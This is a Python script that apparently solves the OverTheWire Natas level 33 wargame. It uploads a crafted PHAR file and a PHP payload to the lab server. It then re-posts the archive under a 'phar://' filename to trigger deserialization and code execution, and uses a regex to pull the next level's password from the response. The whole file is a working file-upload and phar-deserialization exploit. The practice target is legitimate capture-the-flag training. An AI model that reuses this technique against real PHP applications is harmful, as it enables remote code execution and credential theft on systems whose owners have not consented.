import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    passw = subprocess.run(['getpass', '33'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas33', passw.strip())
    phar_payload = {'uploadedfile': open('exploit.phar', 'rb')}    
    php_payload = {'uploadedfile': open('payload.php', 'rb')}
    final_payload = {'uploadedfile': open('exploit.phar', 'rb')}    
    #Filename assignments for each payload
    phar_data = {'filename':'taldgan.phar'}
    php_data = {'filename':'taldgan.php'}
    final_data = {'filename':'phar://taldgan.phar'}

    #Need to make 3 request: 1 to upload the php payload, 1 to upload the phar, and 1 to read the phar with phar://taldgan.phar as the filename
    requests.post('http://natas33.natas.labs.overthewire.org/', auth=auth, files=phar_payload, data=phar_data)  
    requests.post('http://natas33.natas.labs.overthewire.org/', auth=auth, files=php_payload, data=php_data)  
    r = requests.post('http://natas33.natas.labs.overthewire.org/', auth=auth, files=final_payload, data=final_data)  
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[0])

if __name__ == "__main__":
    get_pass()
